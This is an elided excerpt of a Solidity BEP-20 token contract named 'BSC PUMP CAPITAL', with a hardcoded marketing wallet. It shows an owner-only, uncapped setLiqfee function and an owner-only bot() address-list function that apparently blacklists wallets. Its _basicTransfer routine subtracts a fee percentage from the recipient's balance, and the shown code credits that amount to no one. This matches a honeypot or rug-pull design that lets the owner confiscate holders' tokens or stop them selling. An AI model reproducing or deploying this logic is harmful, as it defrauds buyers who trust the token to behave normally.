...
contract CAPITAL is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "BSC PUMP CAPITAL";
    string private _symbol = "PUMP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa81611a3Ae1dD2f8051Def5544798045bB28Dcba); // Marketing Address
    ...
    function setLiqfee(uint256 newLiq) external onlyOwner() {
        _sellLiquidityFee = newLiq;
    }

    function bot(address[] calldata addresses) external onlyOwner {
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) private {        
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _sellLiquidityFee);   
